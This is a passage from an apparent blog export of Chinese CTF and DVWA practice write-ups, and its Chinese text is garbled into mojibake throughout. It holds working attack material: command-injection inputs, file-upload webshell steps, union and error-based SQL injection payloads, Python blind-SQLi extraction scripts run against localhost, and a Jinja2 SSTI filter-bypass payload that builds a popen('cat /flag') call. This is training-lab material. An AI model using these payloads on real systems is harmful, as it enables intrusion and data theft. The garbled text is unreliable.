ä»¥ä¸Šä¸‰ç§è¿æ¥ç¬¦åœ¨windowså’Œlinuxç¯å¢ƒä¸‹éƒ½æ”¯æŒå¦‚æœç¨‹åºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿æ¥ç¬¦æ‰§è¡Œå¤šæ¡ç³»ç»Ÿå‘½ä»¤ã€‚åœ¨æœ¬é¢˜ä¸­æºä»£ç æ²¡æœ‰ä½“ç°å¯¹ipçš„ä»»ä½•è¿‡æ»¤ ç³»ç»Ÿå‘½ä»¤æ•´ç†ï¼šwindowsä¸‹ï¼šhttps://www.shuzhiduo.com/A/Vx5MBqZLdN/linuxä¸‹ï¼šhttps://www.cnblogs.com/54chensongxia/p/12510758.html é‚£ä¹ˆè¿™é¢˜å¦‚ä½•è§£ç­”å°±å¾ˆæ˜äº†äº†ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨è¿™å†™ç³»ç»Ÿå‘½ä»¤å‡½æ•°ï¼Œå°±æ˜¯åˆ©ç”¨è¿™äº›å‘½ä»¤è¿æ¥ç¬¦ lowï¼šè®¤è¯†å‡ ä¸ªå‡½æ•°ï¼šshell_exec()å‡½æ•°æ˜¯PHPä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºé€šè¿‡shellæ‰§è¡Œå‘½ä»¤å¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›å®Œæ•´çš„è¾“å‡ºã€‚stristr(string,search,before_search)stristrå‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»åŒ¹é…ç‚¹ï¼‰ï¼Œå¦‚æœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› FALSEã€‚å‚æ•°stringè§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼Œå‚æ•°searchè§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII å€¼çš„å­—ç¬¦ï¼‰ï¼Œå¯é€‰å‚æ•°before_trueä¸ºå¸ƒå°”å‹ï¼Œé»˜è®¤ä¸ºâ€falseâ€ ï¼Œå¦‚æœè®¾ç½®ä¸º â€œtrueâ€ï¼Œå‡½æ•°å°†è¿”å› search å‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚php_uname(mode)è¿™ä¸ªå‡½æ•°ä¼šè¿”å›è¿è¡Œphpçš„æ“ä½œç³»ç»Ÿçš„ç›¸å…³æè¿°ï¼Œå‚æ•°modeå¯å–å€¼â€aâ€ ï¼ˆæ­¤ä¸ºé»˜è®¤ï¼ŒåŒ…å«åºåˆ—â€s n r v mâ€é‡Œçš„æ‰€æœ‰æ¨¡å¼ï¼‰ï¼Œâ€s â€ï¼ˆè¿”å›æ“ä½œç³»ç»Ÿåç§°ï¼‰ï¼Œâ€nâ€ï¼ˆè¿”å›ä¸»æœºåï¼‰ï¼Œâ€ râ€ï¼ˆè¿”å›ç‰ˆæœ¬åç§°ï¼‰ï¼Œâ€vâ€ï¼ˆè¿”å›ç‰ˆæœ¬ä¿¡æ¯ï¼‰ï¼Œ â€mâ€ï¼ˆè¿”å›æœºå™¨ç±»å‹ï¼‰ã€‚ ç„¶åæ¥ä¸‹æ¥è¾“å…¥ ping&amp;&amp;ç³»ç»Ÿå‘½ä»¤ï¼› mediumåœ¨è¿™ä¸€å…³ä¸­ è¿‡æ»¤äº†&amp;&amp; å’Œ; çœ‹çœ‹ä¸Šé¢çš„å‘½ä»¤è¿æ¥ç¬¦ï¼Œè¿˜æœ‰&amp; |ç­‰å…¶ä»–ç¬¦å·å¯ä»¥ä½¿ç”¨é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¦è¿‡æ»¤ï¼›å‘¢ï¼Ÿ åœ¨linuxç³»ç»Ÿå½“ä¸­æ˜¯å¯ä»¥ç”¨ï¼›å·æ¥æ›¿æ¢è¿™äº›å‘½ä»¤è¿æ¥ç¬¦çš„ é‚£ä¹ˆå¦‚æœä¸€å®šè¦ç”¨&amp;&amp;è¯¥å¦‚ä½•ç»•è¿‡å‘¢è¿™é‡Œçœ‹åˆ°â€127.0.0.1&amp;;&amp;ipconfigâ€ä¸­çš„â€ ;â€ä¼šè¢«æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œè¿™æ ·ä¸€æ¥å°±å˜æˆäº†â€127.0.0.1&amp;&amp; ipconfigâ€ ï¼Œä¼šæˆåŠŸæ‰§è¡Œã€‚ highåœ¨è¿™ä¸€å…³ä¸­ï¼Œè¿‡æ»¤äº†å¾ˆå¤šäº†ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°è¿‡æ»¤çš„ä¸æ˜¯|è€Œæ˜¯|+ä¸€ä¸ªç©ºæ ¼ æˆ‘å°±çº³é—·äº†ï¼Œä¸ºå•¥ä¸ç›´æ¥è¿‡æ»¤| ä¸ºäº†è®©æˆ‘ä»¬è¿‡äº†è¿™ä¸ªå…³å¡å—ï¼Ÿæœ‰ç‚¹å°æ— è¯­å“ˆå“ˆå“ˆï¼Œæ€»è€Œè¨€ä¹‹æˆ‘ä»¬è¾“å…¥127.0.0.1|net user impossibleimpossibleå…³å¡çš„è¿‡æ»¤æœºåˆ¶è®©æˆ‘æƒ³åˆ°äº†åˆšåˆ·å®Œçš„uploadï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„å…ˆæŠŠå…¶ä»–å­—ç¬¦ç»™è¿‡æ»¤æ‰ï¼Œç„¶åç”¨.åˆ†å‰²æˆå¤šä¸ªæ•°ç»„ï¼Œåˆ†åˆ«éªŒè¯æ˜¯å¦ä¸ºæ•°å­—ï¼Œå†å°†è¿™å‡ ä¸ªæ•°ç»„è¿›è¡Œæ‹¼æ¥ ANTI CSRF TOKENï¼šè¿™ä¸ªæ˜¯ç”¨æ¥é˜²èŒƒcsrfæ”»å‡»çš„ï¼Œä½†æ˜¯csrfæ˜¯ä»€ä¹ˆï¼Ÿè¿˜æ²¡å­¦åˆ°ï¼Œæˆ‘çœ‹ä¸‹é¢çš„é¢˜ç›®æœ‰ï¼Œå…ˆæ¥ç€åšå§https://blog.chenhaotaishuaile.com/2019/03/16/csrf-token-generate/ æ–‡ä»¶ä¸Šä¼ lowè¿™é‡Œè®©æˆ‘ä»¬ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥ä¸Šä¼ ç„¶åburpæŠ“åŒ…æ”¹åç¼€ä»–çš„ç›¸å¯¹è·¯å¾„å·²ç»å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çŒœè§£å…¶ç»å¯¹è·¯å¾„ 1http://localhost:81/DVWA-master/hackable/uploads/123.php mediumåœ¨ä¸­çº§çš„é¢˜ç›®ä¸­ï¼ŒéªŒè¯äº†åç¼€æ˜¯æ˜¯å¦jpgå’Œpngå›¾ç‰‡æ ¼å¼åç¼€çš„æ–¹æ³•ä¸€ï¼šburpæ”¹åç¼€æ–¹æ³•äºŒï¼šä¸Šä¼ æ–‡ä»¶ååˆ©ç”¨ä¸Šä¸€å…³çš„æ–‡ä»¶åŒ…å«æ¼æ´æ–¹æ³•ä¸‰ï¼šå› ä¸ºæœ‰move_uploaded_file()å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä¸€ä¸‹00æˆªæ–­ä¸Šä¼ jpg highå’Œä¹‹å‰å·®åˆ«ä¸å¤§ï¼Œä½†æ˜¯å¤šäº†getimagesize()è¿™ä¸ªå‡½æ•°ï¼Œæ„å‘³ç€è¿™é‡Œè¦æ˜¯ç”¨å›¾ç‰‡æœ¨é©¬å°†å›¾ç‰‡å’Œæœ¨é©¬ç”¨ 1copy 1.jpg/b+2.php/a 12.jpg impossiblein_get(varname)å‡½æ•°è¿”å›ç›¸åº”é€‰é¡¹çš„å€¼imagecreatefromjpeg ( filename )å‡½æ•°è¿”å›å›¾ç‰‡æ–‡ä»¶çš„å›¾åƒæ ‡è¯†ï¼Œå¤±è´¥è¿”å›falseimagejpeg ( image , filename , quality)ä»imageå›¾åƒä»¥filenameä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªJPEGå›¾åƒï¼Œå¯é€‰å‚æ•°qualityï¼ŒèŒƒå›´ä» 0ï¼ˆæœ€å·®è´¨é‡ï¼Œæ–‡ä»¶æ›´å°ï¼‰åˆ° 100ï¼ˆæœ€ä½³è´¨é‡ï¼Œæ–‡ä»¶æœ€å¤§ï¼‰ã€‚imagedestroy( img )å‡½æ•°é”€æ¯å›¾åƒèµ„æº sql injectionlowï¼š1.å­—ç¬¦å‹ æ³¨å…¥â€”â€”1â€™or 1=1â€™1 /1â€™or 1=1#2.payload: 12345union selctè”åˆæ³¨å…¥ï¼š1'order by 2# â€”â€”æœ‰ä¸¤åˆ—1'union select 1,2#1' union select database(),2#1'union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'# payload 12extractvalueæŠ¥é”™æ³¨å…¥1' and extractvalue(1,concat('~',database(),'~'))# medium è¿™ä¸€å…³ä½¿ç”¨ä¸‹æ‹‰é€‰æ‹©çš„æ–¹å¼è¿›è¡Œç™»å½•ï¼Œæ‰€ä»¥å°±æ²¡åŠæ³•åœ¨è¿™é‡Œè¿›è¡Œæ³¨å…¥ï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯POSTç±»å‹æäº¤æ•°æ®ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹æŠ“åŒ…è¿›è¡Œä¿®æ”¹æ•°æ® ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125083457.png) å¯ä»¥å‘ç°ï¼Œä»–è¿™æ¬¡å¯¹â€™å’Œ\\éƒ½è¿‡æ»¤äº†ï¼Œå®ç°è½¬ä¹‰ ç„¶åå›åˆ°èµ·ç‚¹ï¼Œå‘ç°ï¼Œè¿™æ¬¡æ˜¯æ•°å­—å‹æ³¨å…¥å•Šï¼Ÿï¼Ÿï¼Ÿé‚£ä¸ªè¿‡æ»¤æ–¹å¼æœ‰å•¥æ„ä¹‰å—ï¼Ÿï¼Ÿpayload: 121 union select 1,database()#1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761//è¿™é‡Œç”±äºè¿‡æ»¤äº†å•å¼•å·ï¼Œæ‰€ä»¥åªèƒ½ç”¨16è¿›åˆ¶è¿›è¡Œç¼–ç ç„¶åç»•è¿‡ï¼Œdvwa=0x64767761 payload: 11 and extractvalue(1,concat(1,database()))# highå¾ˆå¥‡æ€ªï¼Œæˆ‘è¾“å…¥1â€™ union select 1,database()#å é¡µé¢å˜æˆå¹¶ä¸”æ€ä¹ˆåˆ·æ–°è¿”å›é‡å¯éƒ½æ²¡ç”¨ impossible1234567891011121314151617181920212223242526if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );//è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥é˜²æ­¢sqlmapå§ï¼Œå› ä¸ºæ¯ä¸€æ¬¡çš„æäº¤éƒ½è¦é‡æ–°æäº¤ä¸€ä¸ªtoken // Get input $id = $_GET[ 'id' ]; // Was a number entered?if(is_numeric( $id )) { // Check the database$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );//bindParam()ï¼šç»‘å®šä¸€ä¸ªå‚æ•°åˆ°æŒ‡å®šçš„å˜é‡åï¼Œåœ¨è¿™é‡Œä»–å°±æ˜¯è®©idä¸ºintç±»å‹çš„å˜é‡$data-&gt;execute();$row = $data-&gt;fetch(); æ ¹æ®ä»¥ä¸Šçš„è§£æï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šä¸å­˜åœ¨æ³¨å…¥ç‚¹äº† sql injection(blind)lowå› ä¸ºä»–çš„è¿”å›ç»“æœåªæœ‰å­˜åœ¨æˆ–è€…ä¸å­˜åœ¨åœ¨æ•°æ®åº“å½“ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåªå¥½å°è¯•ä½¿ç”¨ç›²æ³¨:è¿™é‡Œç¼–å†™ä¸€ä¸ªç›²æ³¨è„šæœ¬,å‰é¢å‘ç°æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œgetç±»å‹ï¼ŒæŸ¥çœ‹æºç å‘ç°æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ç¼–å†™è„šæœ¬: çŒœè§£æ•°æ®åº“é•¿åº¦ 12345678910111213141516import requestss=requests.Session()url=&quot;http://localhost:81/DVWA-master/vulnerabilities/sqli_blind/&quot;headers={'Cookie':'security=low;PHPSESSID=45nnfme23ea8iumsihnr6gqc7i; night_mode=0'}print(&quot;---å¼€å§‹çŒœè§£æ•°æ®åº“åé•¿åº¦---&quot;)for j in range(0,50): database_length=&quot;?id=1\\'and+length(database())='%d'--+&amp;Submit=Submit#&quot;%j#è¿™é‡Œçš„è¯­å¥è¿˜å¯ä»¥æ›¿æ¢æˆ:#database_length=f&quot;?id=1\\'and+length(database())={j}--+&amp;Submit=Submit#&quot;#database_length='?id=1\\'and+length(database())='+str(j)+'--+&amp;Submit=Submit#' if 'exists' in s.get(url+database_length,headers=headers).text: databaselength = j #print(s.get(url+database_length,headers=headers).text) print(url+database_length) print(&quot;æ•°æ®åº“çš„é•¿åº¦ä¸º&quot; + str(databaselength)) break çŒœè§£æ•°æ®åº“çš„åå­—: 123456789print(&quot;-----å¼€å§‹çŒœè§£æ•°æ®åº“å-------&quot;)databasename = ''for j in range(1,databaselength+1): for i in payloads: database_payload=f&quot;?id=1\\'and+substr(database(),{j},1)='{i}'%23&amp;Submit=Submit#&quot; print(database_payload//è°ƒè¯•ç”¨çš„ if 'exists' in s.get(url+database_payload,headers=headers).text: databasename +=iprint('æ•°æ®åº“çš„åå­—ä¸º:'+databasename) æŸ¥è¯¢è¡¨çš„æ•°ç›®: 12345678print(&quot;-----å¼€å§‹çŒœè§£è¡¨æ•°-------&quot;)for j in range(0,50): table_count=f&quot;?id=1'and (select count(table_name)from information_schema.tables where table_schema=database())={j}%23&amp;Submit=Submit#&quot; print(table_count) if 'exists' in s.get(url+table_count,headers=headers).text: tablecount=j print(&quot;è¡¨çš„æ•°ç›®æ˜¯&quot;+str(tablecount)) break æŸ¥è¯¢è¡¨å 1234567891011121314151617print(&quot;-----å¼€å§‹çŒœè§£è¡¨å-------&quot;)for j in range(0, tablecount): table_name = '' for i in range(0, 50): tab_length = f'?id=1\\'and (select length(table_name) from information_schema.tables where table_schema=database() limit {j},1)={i}%23&amp;Submit=Submit#' # print(tablength) if 'exists' in s.get(url + tab_length, headers=headers).text: tablength = i print(&quot;ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸º:%d&quot; % i)#ä»¥ä¸Šæ˜¯ä¸ºäº†å¾—å‡ºæ¯ä¸€ä¸ªè¡¨çš„é•¿åº¦ for m in range(0, tablength+1): for n in payloads: table_payload = f'?id=1\\'and substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{m},1)=\\'{n}\\'%23&amp;Submit=Submit#' #print(table_payload) if 'User ID exists in the database.' in s.get(url + table_payload, headers=headers).text: table_name += n print('table_name%d:'%(j+1)+table_name) æŸ¥è¯¢åˆ—å 123456789101112131415161718192021222324columnNum = 0 for j in range(50): columnNum_payload = '?id=1\\' and (select count(column_name) from information_schema.columns where table_name=\\'flagishere\\')='+str(j)+' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+columnNum_payload, headers=headers).text: columnNum = j breakprint('columnNum: '+str(columnNum))# 2.çˆ†å‡ºæ¯ä¸ªå­—æ®µåçš„é•¿åº¦for j in range(0,columnNum): column_name = '' for i in range(1,50): columnLen_payload = '?id=1\\' and length(substr((select column_name from information_schema.columns where table_name=\\'flagishere\\' limit '+str(j)+',1),1))='+str(i)+' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+columnLen_payload, headers=headers).text: columnLen = i print('column'+str(j+1)+'_length: '+str(columnLen)) # (2)å†…éƒ¨å¾ªç¯çˆ†ç ´æ¯ä¸ªè¡¨çš„è¡¨å for m in range(1,columnLen+1): for n in payloads: # iåœ¨ä¸Šä¸ªå¾ªç¯ç”¨è¿‡äº† column_payload = '?id=1\\' and substr((select column_name from information_schema.columns where table_name=\\'flagishere\\' limit '+str(j)+',1),'+str(m)+',1)=\\''+str(n)+'\\' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+column_payload, headers=headers).text: column_name += n print('column'+str(j+1)+'_name: '+column_name) æœç„¶æœ€éº»çƒ¦å¾—ä¸è¿‡å†™è„šæœ¬ mediumï¼šè¿™ä¸€æ¬¡æ˜¯éœ€è¦å†™postç±»å‹çš„è„šæœ¬ å…ˆä¸ªå‘å§ï¼Œåé¢å†æ¥è¡¥ï¼Œåˆå­¦pythonå†™è„šæœ¬å¤ªç´¯äº†ï¼Œå¯èƒ½ä¹Ÿæ˜¯å› ä¸ºè¿™å‡ å¤©çŠ¶æ€ä¸å¥½å§ CSP BYPASShttps://www.cnblogs.com/-zhong/p/10906270.html JAVA SCRIPThttps://www.cnblogs.com/jojo-feed/p/10206443.html","link":"/2021/01/20/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"},{"title":"ISCCæ‹¬å·è¿‡æ»¤é¢˜å¤ç°","text":"æœ¬åœ°æ•°æ®åº“å»ºç«‹åˆ›å»ºæ•°æ®åº“: 1create database test1; åˆ›å»ºè¡¨ï¼š 12345create table `admin`(`id` int(10) not null primary key auto_increment,`username` varchar(20) not null,`password` varchar(32) not null); æ’å…¥æ•°æ®: 1234insert into admin(username,passowrd)values(&quot;admin&quot;,&quot;saddagfkljeaf&quot;) å¼€å§‹è§£é¢˜æµ‹è¯•æ•°æ®ï¼šè¾“å…¥ä»»ä½•æ•°æ® å‘ç°è¿”å›çš„éƒ½æ˜¯æ„æ€å°±æ˜¯ flagåœ¨passwordæ é‡Œæ¥ä¸‹æ¥ä½¿ç”¨sqlæ³¨å…¥æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°å½“æˆ‘ä»¬åœ¨å•å¼•å·åè¾“å…¥=çš„æ—¶å€™é¡µé¢å›æ˜¾:illegal inputï¼Œburp suitçˆ†ç ´æµ‹è¯•ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆæ•°æ®ï¼šè¿‡æ»¤äº†ä¸€äº›ç›²æ³¨å‡½æ•°åŒ…æ‹¬like regexpï¼Œè¿˜æœ‰whereç­‰unionæŸ¥è¯¢éœ€è¦ä½¿ç”¨çš„æ¥ä¸‹æ¥ç»§ç»­æµ‹è¯•ä¸€ä¸‹ï¼Œç¡®å®šéœ€è¦ä½¿ç”¨ä»€ä¹ˆç›²æ³¨:å½“æˆ‘ä»¬è¾“å…¥adminâ€™and 1&lt;2#â€”â€”é¡µé¢å›æ˜¾æ˜¯adminä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ˜¯å› ä¸ºæ­¤ç”¨æˆ·åå­˜åœ¨æ‰ä¼šå›æ˜¾å‡ºæ¥å½“æˆ‘ä»¬è¾“å…¥adminâ€™and 1&gt;2#â€”â€”é¡µé¢å›æ˜¾æ˜¯the content in the passwordâ€¦.æ‰€ä»¥å¯ä»¥ç¡®å®šè¿™é‡Œå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨æ¥ä¸‹æ¥éœ€è¦ç¡®å®šä½¿ç”¨ä»€ä¹ˆè¯­å¥è¿›è¡Œæ³¨å…¥:ç”±äºè¿‡æ»¤æ‹¬å·ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨substrç­‰ç›²æ³¨å¸¸ç”¨å‡½æ•°è¿›è¡Œè§£é¢˜è¿™é‡Œå°±è¦æ‹“å±•å­¦ä¹ ä¸€ç§æ–°æ–¹æ³•äº†: union select+order byç›²æ³¨ æˆ‘ä»¬è¿™é‡Œä»åå¾€å‰è§£æï¼Œorder by 3,2çš„æ„æ€æ˜¯å…ˆæ’åºç¬¬ä¸‰åˆ—å†æ’åºç¬¬äºŒåˆ— æˆ‘ä»¬ä½¿ç”¨çš„union select æ’å…¥çš„æ•°æ®çš„ç¬¬ä¸‰åˆ—çš„æ•°æ®å¦‚æœå°äºç­‰äºadminçš„ç¬¬ä¸‰åˆ—ï¼Œæ˜¾ç¤ºçš„å³ä¸ºæˆ‘ä»¬æ’å…¥çš„æ•°æ®ï¼Œå¦‚æœå¤§äºæ˜¾ç¤ºçš„å³ä¸ºadminä¸€è¡Œçš„æ•°æ®ï¼Œæ¥ä¸‹æ¥ç¼–å†™ç›²æ³¨è„šæœ¬: 12345678910111213141516import requestss= requests.session()url=&quot;http://localhost:81/iscc%e6%8b%ac%e5%8f%b7%e8%bf%87%e6%bb%a4%e8%81%94%e7%b3%bb%e9%a2%98.php&quot;payload_try='abcdefghijklmnopqrstuvwxyz'passwd=&quot;&quot;x=''for i in range(1,30): for j in payload_try: payload=f&quot;admin'union select 1,2,'{j}' order by 3,2#&quot; print(payload) data={&quot;username&quot;:payload,&quot;password&quot;:&quot;sky&quot;} if 'admin' in s.post(url,data).text: passwd+=x print(passwd) break x=j è¿™é‡Œæœ‰ä¸ªç‚¹éœ€è¦æ³¨æ„çš„å°±æ˜¯:ç”±äºä½¿ç”¨çš„æ˜¯order byçš„æ’åºæœºåˆ¶ï¼Œæ‰€ä»¥ç¨‹åºä¸ä¼šè‡ªå·±ç»ˆæ­¢ï¼Œå°±æ˜¯ä¼šä¸€ç›´æŒ‰æœ€åä¸€ä½çš„å­—æ¯å åŠ ä¸‹å»ï¼Œè¦è®°å¾—è¾¨è¯†ã€‚ç”±äºæˆ‘æ¯”è¾ƒæ‡’ï¼Œæ‰€ä»¥å¯†ç å¼„å¾—å°±æ˜¯ggggggggï¼Œäºæ˜¯å°±æœ‰äº†ä¸Šé¢çš„ç»“æœã€‚è€Œåœ¨æœ¬é¢˜ä¸­ï¼Œå¯†ç å°±æ˜¯flagã€‚è¿™ç¯‡åšå®¢ä¼¼ä¹æœ‰ç‚¹æ°´å“ˆå“ˆå“ˆå“ˆå“ˆå¼€å­¦ä¹Ÿè¦å¥½å¥½åŠ æ²¹å“‡ï¼","link":"/2021/03/10/ISCC%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"title":"MAR DASCTFå¤ç°","text":"baby_flaskblacklist&lt;/br&gt; '.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','ï¼','ï¼‘','ï¼’','ï¼“','ï¼”','ï¼•','ï¼–','ï¼—','ï¼˜','ï¼™','0','1','2','3','4','5','6','7','8','9'&lt; ä»¥ä¸Šå¼è¿‡æ»¤çš„å…³é”®å­—ï¼Œçœ‹èµ·æ¥æ˜¯å•¥éƒ½è¢«è¿‡æ»¤äº†éœ€è¦ç»•è¿‡: æ„Ÿè§‰å¯¹äºå‡½æ•°è¿˜æ˜¯ä¸€æ— æ‰€çŸ¥ï¼Œå†³å®šå»å•ƒä¸€ä¸‹flaskæ¡†æ¶çš„æ–‡æ¡£:å¥½äº† ï¼Œå•ƒå®Œå›æ¥äº†ï¼Œç›´æ¥å¼€å§‹æ„é€ payloadå§:æ€è·¯:ç”±äºå®ƒè¿‡æ»¤å¾ˆå¤šå†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¦å°†å®ƒè¿‡æ»¤çš„å†…å®¹ä»¥å…¶ä»–å½¢å¼æ›¿æ¢æ‰¾å‡ºæ¥:ä¸¾ä¸ªæ —å­:ä»–è¿‡æ»¤çš„æ•°å­—æˆ‘ä»¬å¯ä»¥ç”¨:ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—æ¥ä»£æ›¿æˆ‘ä»¬å…ˆæ¥è´´ä¸€ä¸‹ä¸€ä¸ªå¤§ç¥çš„payloadï¼Œå†æ ¹æ®ä»–çš„æ„é€ æœ¬é¢˜çš„payload: #Authorï¼šé¢–å¥‡L'Amore{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%} # _{% set spa = ((app.__doc__|list()).pop(102)|string())%} #ç©ºæ ¼{% set pt = ((app.__doc__|list()).pop(320)|string())%} #ç‚¹{% set yin = ((app.__doc__|list()).pop(337)|string())%} #å•å¼•å·{% set left = ((app.__doc__|list()).pop(264)|string())%} #å·¦æ‹¬å· ï¼ˆ{% set right = ((app.__doc__|list()).pop(286)|string())%} #å³æ‹¬å·ï¼‰{% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%} #æ–œçº¿/{% set bu = dict(buil=aa,tins=dd)|join() %} #builtins{% set im = dict(imp=aa,ort=dd)|join() %} #import{% set sy = dict(po=aa,pen=dd)|join() %} #popen{% set os = dict(o=aa,s=dd)|join() %} #os{% set ca = dict(ca=aa,t=dd)|join() %} #cat{% set flg = dict(fl=aa,ag=dd)|join() %} #flag{% set ev = dict(ev=aa,al=dd)|join() %} #eval{% set red = dict(re=aa,ad=dd)|join()%} #read{% set bul = xhx*2~bu~xhx*2 %} #__builtins__#æ‹¼æ¥èµ·æ¥ __import__('os').popen('cat /flag').read(){% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} å‚è€ƒ:http://ctf.ieki.xyz/library/ssti.html è¿™é‡Œæˆ‘å°±è§£æä¸€ä¸‹å‡ ä¸ªçœ‹ä¸å¤ªæ‡‚çš„ç‚¹:1.__doc__çš„ä½œç”¨æŒ‰æˆ‘çš„ç†è§£æ˜¯ï¼Œè°ƒç”¨appä¸­çš„æ–‡æ¡£å­—ç¬¦ä¸²ï¼Œç„¶åå°†å®ƒæ”¶å…¥listå½“ä¸­ï¼Œæœ€åä½¿ç”¨popå‡½æ•°è°ƒç”¨å‡ºæ¥ç‰¹å®šçš„æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦å¹¶ä½¿ç”¨string()å‡½æ•°å°†è¿™ä¸ªå˜é‡è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼ˆæ„Ÿè§‰å¾ˆå·§å¦™ï¼Œæ‰“å¼€æ–°æ€è·¯äº†ï¼‰ã€‚2.æ¥ä¸‹æ¥å°±æ˜¯å®šä¹‰å‡ ä¸ªdictï¼Œç„¶åä½¿ç”¨join()å‡½æ•°å°†å…¶è¿›è¡Œæ‹¼æ¥3.æœ€åå°±æ˜¯å®ç°è°ƒç”¨ å‚è€ƒï¼šhttps://blog.csdn.net/miuzzx/article/details/110220425 å›çœ‹æœ¬é¢˜:è¿‡æ»¤äº†pop()ä½†æ˜¯æ²¡è¿‡æ»¤attrï¼Œattrå¯ä»¥è·å–å¯¹è±¡çš„å±æ€§ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸ºâ€ä½œç”¨â€: {%set a=dict(op=x,p=x)|join()%}#pop{%set b=(()|select|string|list)|attr(a)(ğŸğŸ’)%}#è·å–ä¸‹åˆ’çº¿_{%set c=dict(b,b,dict(do=x,c=x)|join,b,b)join()%}#è·å–__doc__{%set d=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸ‘ğŸ•)%}#å•å¼•å·ï¼Œè¿™é‡Œçš„xçš„æ„æ€æˆ‘ç†è§£ä¸ºæ˜¯ä¸€ä¸ªä¸­è½¬å˜é‡ï¼Œä¸ºäº†åé¢çš„attr(a)åšå‡†å¤‡{%set e=(x|attr(c)|list)|attr(a)(ğŸğŸ”ğŸ’)%}#å·¦æ‹¬å·{%set f=(x|attr(c)|list)|attr(a)(ğŸğŸ–ğŸ”)%}#å³æ‹¬å·{%set g=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸğŸ)%}#ç‚¹{%set h=(x|attr(c)|list)|attr(a)(ğŸğŸğŸ)%}#ç©ºæ ¼{%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%}#__init__{%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%}#__globals__{%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%}#__getitem__{%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%}#__builtins__{%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%}#__import__{%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(ğŸ‘ğŸ’ğŸ—)%}#å¼•å…¥/{%set o=dict(ev=x,al=x)|join()%}{%set p=dict(o=x,s=x)|join()%}{%set q=dict(po=x,pen=x)|join()%}{%set r=dict(re=x,ad=x)|join()%}{%set 